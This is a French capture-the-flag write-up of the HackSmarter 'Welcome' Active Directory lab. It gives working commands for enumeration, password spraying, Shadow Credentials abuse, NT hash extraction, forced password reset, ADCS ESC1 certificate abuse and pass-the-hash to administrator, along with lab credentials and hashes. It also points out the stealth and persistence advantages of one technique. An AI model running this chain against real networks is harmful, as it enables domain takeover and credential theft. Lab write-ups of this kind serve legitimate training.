---
layout: post
title: "HackSmarter - Welcome Lab Writeup"
date: 2025-11-07
categories: writeup
tags: adcs, esc1, bloodhound, smb, privilege-escalation,hacksmarter,active-directory
---

# HackSmarter - Welcome Lab Writeup

**Difficulté**: Easy  
**Auteur**: Noah Heroldt  
**Date**: 07 Novembre 2025

## Scenario

Vous êtes membre de l'équipe Red Team de Hack Smarter. Lors d'un engagement de phishing, vous avez pu récupérer des identifiants pour l'environnement Active Directory du client. Utilisez ces identifiants pour énumérer l'environnement, élever vos privilèges et démontrer l'impact pour le client.

**Identifiants de départ**: `e.hills:Il0vemyj0b2025!`

## Énumération initiale

### Configuration de l'environnement

Premièrement, nous configurons nos variables d'environnement pour faciliter notre travail sur exegol:

```bash
export PASSWORD='Il0vemyj0b2025!'
export TARGET=10.1.111.149
export USER=e.hills
export DOMAIN=welcome.local
```

### Test d'authentification SMB

Nous commençons par tester l'authentification SMB avec nos identifiants :

```bash
nxc smb "$TARGET" -u "$USER" -p "$PASSWORD"
```

L'authentification réussit, confirmant que nous avons accès au domaine `WELCOME.local` sur le contrôleur de domaine `DC01`.

### Génération du fichier hosts

Pour assurer une résolution de noms cohérente, nous générons et ajoutons une entrée dans notre fichier `/etc/hosts` :

```bash
nxc smb "$TARGET" -u "$USER" -p "$PASSWORD" --generate-hosts ./hosts
cat hosts | sudo tee -a /etc/hosts
```

## Énumération avec BloodHound

### Collecte de données

Nous utilisons BloodHound pour énumérer le domaine Active Directory :

```bash
bloodhound-python -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -gc "$DOMAIN" -ns "$TARGET" -c all --zip
```

Cette commande génère un fichier ZIP contenant toutes les données d'énumération du domaine.

### Énumération des utilisateurs

Nous énumérons également les utilisateurs directement via SMB :

```bash
nxc smb "$TARGET" -u "$USER" -p "$PASSWORD" --users
```

Utilisateurs identifiés :
- `Administrator`
- `Guest` 
- `krbtgt`
- `e.hills`
- `j.crickets`
- `e.blanch`
- `i.park` (IT Intern)
- `j.johnson`
- `a.harris`
- `svc_ca`
- `svc_web` (Web Server in Progress)

## Énumération des partages SMB

### Découverte des partages

```bash
nxc smb "$TARGET" -u "$USER" -p "$PASSWORD" --shares
```

Partages disponibles :
- `ADMIN$` (pas d'accès)
- `C$` (pas d'accès)
- **`Human Resources`** (READ) ⭐
- `IPC$` (READ)
- `NETLOGON` (READ)

### Spider des fichiers

Nous utilisons le module `spider_plus` pour télécharger automatiquement les fichiers intéressants :

```bash
nxc smb $TARGET -u "$USER" -p "$PASSWORD" --shares -M spider_plus -o DOWNLOAD_FLAG=true
```

## Découverte d'Active Directory Certificate Services (ADCS)

### Énumération ADCS

Nous vérifions la présence d'ADCS dans l'environnement :

```bash
nxc ldap $TARGET -u "$USER" -p "$PASSWORD" -M adcs
```

Résultat : ADCS est présent avec une autorité de certification nommée `WELCOME-CA`.

### Installation de Certipy

Pour analyser les vulnérabilités ADCS, nous installons Certipy :

```bash
python3 -m venv certipy-venv
source certipy-venv/bin/activate
pip install certipy-ad
```

### Recherche de vulnérabilités

```bash
certipy find -vulnerable -u "$USER@$DOMAIN" -p "$PASSWORD" -stdout
```

Bien que nous n'ayons pas trouvé de templates vulnérables avec l'utilisateur `e.hills`, cette énumération nous sera utile plus tard.

## Escalade de privilèges

### Analyse BloodHound

L'analyse des données BloodHound révèle plusieurs chemins d'attaque potentiels :

1. **Chemin d'escalade identifié** :
   - `a.harris` → permissions `GenericAll` sur `i.park`
   - `i.park` → membre du groupe `Helpdesk` 
   ![dacl_a.harris](/assets/blog/HackSmarter-welcome/dacl_a.harris.png)
   - Groupe `Helpdesk` → permissions `ForceChangePassword` sur les comptes de service
   ![dacl_i.park](/assets/blog/HackSmarter-welcome/dacl_i.park.png)

#### Cassage du mot de passe du  PDF protégé
![pdf_locked](/assets/blog/HackSmarter-welcome/pdf_locked.png)
Nous générons un hash du PDF protégé en utilisant `pdf2john.py` :
    
```bash
pdf2john.py Welcome\ Start\ Guide.pdf > hashes_pdf
```

Ensuite, nous utilisons John the Ripper pour craquer le hash avec le dictionnaire rockyou.txt :

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes_pdf
```

Le cassage réussit et nous révèle le mot de passe du PDF. Une fois déverrouillé, le document d'onboarding contient un **mot de passe par défaut** fourni aux nouveaux employés.
 
#### Password Spraying

Avec ce mot de passe découvert, nous effectuons un password spraying sur tous les utilisateurs identifiés précédemment :

```bash
nxc smb 10.1.111.149 -u users.txt -p 'Welcome2025!@' --continue-on-success
```

Le password spraying réussit et nous obtenons l'accès au compte **`a.harris`** avec le mot de passe `Welcome2025!@`.

#### Vérification des accès a.harris

Nous vérifions les partages accessibles avec ce nouvel utilisateur :

```bash
nxc smb WELCOME.local -u a.harris -p 'Welcome2025!@' --shares
```

Aucun nouveau partage n'est accessible, mais nous nous rappelons des données BloodHound qui montrent que :
- `a.harris` est membre du groupe **`Remote Management Users`** (accès WinRM possible)
- `a.harris` fait partie du groupe **`HR`** qui a des permissions `GenericAll` sur `i.park`

#### Connexion WinRM et récupération du user flag

Nous nous connectons au système via WinRM pour récupérer le premier flag :

```bash
evil-winrm -i WELCOME.local -u a.harris -p 'Welcome2025!@'
```

Le user flag se trouve à l'emplacement : `C:\Users\a.harris\Desktop\user.txt`


### Exploitation GenericAll avec Shadow Credentials

Une fois connecté en tant que `a.harris`, nous exploitons les permissions `GenericAll` sur `i.park` en utilisant la technique **Shadow Credentials** avec `pywhisker` :

```bash
pywhisker -d "$DOMAIN" -u "a.harris" -p "Welcome2025!@" --target "i.park" --action "add"
```

Cette technique ajoute un certificat dans l'attribut `msDS-KeyCredentialLink` de `i.park`, nous permettant d'obtenir un TGT sans connaître le mot de passe.

### Récupération du TGT et du hash NT

Nous utilisons le certificat généré pour obtenir un TGT :

```bash
gettgtpkinit.py -cert-pfx ErVSDsk2.pfx -pfx-pass 'OzIq0HZr3Cq21xctgm9J' "$DOMAIN"/'i.park' 'i.park.ccache'
```

Puis nous récupérons le hash NT de `i.park` :

```bash
KRB5CCNAME=i.park.ccache getnthash.py -key '95b3b38b5877a635814dfd3b176d4f380840749418850da9455eb21e2787d6fb' "$DOMAIN"/'i.park'
```

Hash NT récupéré : `b689c61b88b0f63cfc2033e5dba52c75`

### Accès au compte svc_ca

Avec le hash de `i.park`, nous exploitons les permissions `ForceChangePassword` sur `svc_ca` :

```bash
bloodyAD --host "$TARGET" -d "$DOMAIN" -u "i.park" -p ":b689c61b88b0f63cfc2033e5dba52c75" set password "svc_ca" "Password123"
```

## Exploitation ADCS - ESC1

### Accès au compte svc_ca

Une fois l'accès au compte `svc_ca` obtenu via l'escalade de privilèges, nous recherchons des vulnérabilités ADCS.

### Recherche de templates vulnérables

```bash
certipy find -vulnerable -u "svc_ca@$DOMAIN" -p "Password123" -stdout
```

Le template `Welcome-Template` est vulnérable à **ESC1** car :
- Il autorise l'authentification client (`Client Authentication: True`)
- Il permet à l'utilisateur de fournir son propre sujet (`Enrollee Supplies Subject: True`)
- `svc_ca` a les droits d'inscription (`Enrollment Rights: WELCOME.LOCAL\svc ca`)

### Exploitation ESC1

ESC1 permet de demander un certificat avec un UPN arbitraire, nous permettant d'usurper l'identité de l'administrateur :

1. **Demande de certificat avec UPN Administrator** :
```bash
certipy req -u "svc_ca@$DOMAIN" -p "Password123" -dc-ip "$TARGET" -target "DC01.WELCOME.local" -ca 'WELCOME-CA' -template 'Welcome-Template' -upn 'Administrator@WELCOME.local'
```

2. **Authentification avec le certificat** :
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.1.111.149
```

3. **Récupération du hash NT Administrator** :
```
Got hash for 'administrator@welcome.local': aad3b435b51404eeaad3b435b51404ee:0cf1b799460a39c852068b7c0574677a
```

4. **Vérification de l'accès administrateur** :
```bash
nxc smb WELCOME.local -u Administrator -H '0cf1b799460a39c852068b7c0574677a'
```

## Obtention d'un shell administrateur

Une fois le hash NT de l'administrateur obtenu, nous pouvons utiliser diverses méthodes pour obtenir un shell :

```bash
wmiexec2.py WELCOME.local/Administrator@$TARGET -hashes :HASH_NT -no-pass
```

## Flags

- **User flag** : `C:\Users\a.harris\Desktop\user.txt`
- **Root flag** : `C:\Users\Administrator\Desktop\root.txt`

## Résumé des techniques utilisées

1. **Énumération SMB** avec NetExec
2. **Énumération Active Directory** avec BloodHound
3. **Shadow Credentials (WHISKER)** pour exploiter GenericAll
4. **Kerberos PKINIT** pour l'authentification par certificat
5. **Récupération de hash NT** via getnthash.py
6. **Découverte ADCS** via LDAP
7. **Exploitation ESC1** avec Certipy
8. **Escalade de privilèges** via permissions GenericAll et ForceChangePassword
9. **Pass-the-Hash** pour l'accès administrateur final

## Détails techniques - Shadow Credentials

La technique **Shadow Credentials** (aussi appelée WHISKER) permet d'exploiter les permissions `GenericAll` en :

1. **Ajoutant un certificat** dans l'attribut `msDS-KeyCredentialLink` de l'utilisateur cible
2. **Utilisant PKINIT** pour obtenir un TGT avec ce certificat
3. **Récupérant le hash NT** via un processus d'auto-demande de ticket

Avantages par rapport au changement de mot de passe :
- ✅ **Moins détectable** (pas de changement de mot de passe dans les logs)
- ✅ **Persistance** (le certificat reste jusqu'à suppression manuelle)
- ✅ **Pas d'interruption** de service pour l'utilisateur légitime


---

**Note** : Ce writeup est à des fins éducatives uniquement. N'utilisez ces techniques que dans des environnements autorisés.